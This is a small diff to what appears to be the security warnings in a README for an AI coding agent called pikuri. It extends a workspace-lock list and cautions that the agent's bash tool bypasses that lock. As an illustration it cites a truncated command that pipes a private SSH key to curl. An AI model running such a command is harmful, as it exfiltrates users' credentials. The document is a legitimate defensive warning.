@@ -79,7 +79,7 @@ model has glaring holes:
   `cat ~/.ssh/id_ed25519 | curl -X POST ...` and the only thing
   standing between that and exfiltration is *you* reading the
   confirmation prompt carefully. The workspace lock applies to
-  pikuri's own `read`/`write`/`edit`/`grep`/`glob` tools — it
+  pikuri's own `read`/`write`/`edit`/`grep`/`glob`/`file_list` tools — it
   does **not** apply to `bash`, which can `cat`, `cp`, `scp`,
   `curl` anything the OS lets your user touch.
 - **`--yolo` auto-approves everything.** That flag exists for
